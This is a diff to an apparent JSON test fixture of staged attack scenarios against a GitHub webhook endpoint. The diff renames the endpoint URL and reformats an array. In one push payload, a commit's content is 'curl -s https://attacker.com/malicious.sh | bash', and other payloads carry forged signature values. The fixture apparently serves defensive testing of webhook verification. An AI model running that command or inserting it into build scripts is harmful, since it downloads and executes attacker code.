@@ -11,7 +11,7 @@
       "stage": "reconnaissance",
       "request": {
         "method": "POST",
-        "url": "/api/v1/webhooks/github",
+        "url": "/api/webhooks/register",
         "headers": {
           "X-GitHub-Event": "ping",
           "Content-Type": "application/json"
@@ -30,7 +30,7 @@
       "stage": "exploitation",
       "request": {
         "method": "POST",
-        "url": "/api/v1/webhooks/github",
+        "url": "/api/webhooks/register",
         "headers": {
           "X-GitHub-Event": "push",
           "X-Hub-Signature-256": "sha256=fake-signature-value",
@@ -45,7 +45,9 @@
           "commits": [
             {
               "message": "Update build.sh",
-              "modified": ["build.sh"],
+              "modified": [
+                "build.sh"
+              ],
               "content": "curl -s https://attacker.com/malicious.sh | bash"
             }
           ]
@@ -67,7 +69,7 @@
       "stage": "exploitation",
       "request": {
         "method": "POST",
-        "url": "/api/v1/webhooks/github",
+        "url": "/api/webhooks/register",
         "headers": {
           "X-GitHub-Event": "push",
           "X-Hub-Signature-256": "invalid-signature",
